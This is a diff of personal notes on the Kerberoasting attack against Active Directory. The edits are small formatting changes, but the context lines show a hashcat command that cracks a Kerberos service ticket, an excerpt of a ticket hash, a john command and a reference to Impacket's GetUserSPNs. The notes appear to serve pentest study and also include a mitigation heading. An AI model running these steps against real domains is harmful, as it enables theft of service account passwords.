@@ -1,5 +1,7 @@
 
-To see : [[SPN - Service principal name]]
+To see : 
+[[SPN - Service principal name]]
+[[Kerberos]]
 
 Sources : 
 https://en.hackndo.com/kerberoasting/
@@ -40,7 +42,7 @@ john --session=Kerberoasting output.csv
  -  [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) provided by Impacket
 
 
-# Steps 
+# Steps of Kerberoasing
 
 ### - Enumerates SPN
 
@@ -160,7 +162,7 @@ $krb5tgs$23$*USER$DOMAIN$http/webserver1*$e556af133a0ca7f310381a7294099034$53db1
 ```
 
 .\hashcat32.exe -a 0 -m 13100 C:\Tools\Ghostpack\svc-sql.ticket passwords.lst -o svc-sql.txt -O
-
+#### Hashcat options : 
 - **-a 0** is for dictionary attack, on our case the dictionary is the file **passwords.lst**
 - **-m 13100** is to tell hashcat that we are doing a TGS Kerberos ticket, in our case saved in this location **C:\Tools\Ghostpack\svc-sql.ticket**
 - **-o svc-sql.txt** will save the result with the actual password in a local txt file
@@ -192,9 +194,6 @@ Instance        IsSysadmin
 --------        ----------
 SQLServer1      Yes
 ```
-
-Ccl : 
-Use for lateral movement
 
 ## Mitigation 
 
